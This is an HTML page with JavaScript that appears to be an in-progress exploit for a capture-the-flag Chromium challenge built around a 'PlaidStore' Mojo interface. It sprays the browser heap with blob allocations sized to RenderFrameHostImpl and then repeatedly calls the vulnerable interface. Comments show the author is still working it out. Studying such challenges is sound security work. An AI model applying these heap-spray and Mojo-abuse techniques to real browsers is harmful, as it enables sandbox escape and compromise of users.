<!DOCTYPE html>
<html>
	<script src="/mojo_js_extracted/mojo/public/js/mojo_bindings.js"></script>
	<script src="/mojo_js_extracted/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
	<script src="mojo_js_extracted/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
	<script src="mojo_js_extracted/third_party/blink/public/mojom/blob/blob.mojom.js"></script>
	<script src="mojo_js_extracted/third_party/blink/public/mojom/blob/data_element.mojom.js"></script>

	<script>
		const blob_registry = new blink.mojom.BlobRegistryPtr();
		const blob_registry_request = mojo.makeRequest(blob_registry);
		mojo.Binding(blink.mojom.BlobRegistry, blob_registry_request);

		// start spraying!!
		// what does the "context" means?

		function Allocation(size=0xcd0) {
			function ProgressClient() {
				function ProgressClientImpl() {
				}

				ProgressClientImpl.prototype = {
					onProgress: async (delta) => {
					}
				};

				const progress_client_ptr = new mojo.AssociatedInterfacePtrInfo();
				const progress_client_req = mojo.makeRequest(progress_client_ptr);
				const progress_client_binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);

				return progress_client_ptr;
			};

			this.pipe = Mojo.createDataPipe({elementNumBytes: 
				size, capacityNumBytes: size});

			this.serialized_blob = blob_registry.registerFromStream("", "", size, this.pipe.consumer, ProgressClient());

			this.malloc = function(data) {
				this.pipe.producer.writeData(data);
				this.pipe.producer.close();
			}

			return this;
		}
	</script>

	<script>
		const SPRAY = 40;
		const RENDER_FRAME_HOST_IMPL_SIZE = 0xcd0;
		const data = new Uint8Array(RENDER_FRAME_HOST_IMPL_SIZE).fill(0x41).buffer; //todo: why (.buffer)?
		const heap = [];
		for (let i = 0; i < SPRAY; i++) {
			heap[i] = new Allocation();
		}
	</script>

	<script>
		console.log('spray - ' + SPRAY);
		for(let i = 0; i < SPRAY; i++) {
			heap[i].malloc(data)
		}

		console.log('allocate plaid store object');
		const plaid_store = new blink.mojom.PlaidStorePtr();
		Mojo.bindInterface(blink.mojom.PlaidStore.name,
       		mojo.makeRequest(plaid_store).handle, "context", true);
	</script>

	<script> 
		const MESSAGES = 400;
	</script>

	<script>
		plaid_store.storeData('asdf', [10]);

		for(let i = 0; i < MESSAGES; i++) {
			try {
				const res = plaid_store.getData('asdf', 1)
				.then((bla) => {
					console.log(bla);
				console.log('yay');
			});
			}
			catch (e) {
				console.log(e);
			} 
		}
	</script>
</html>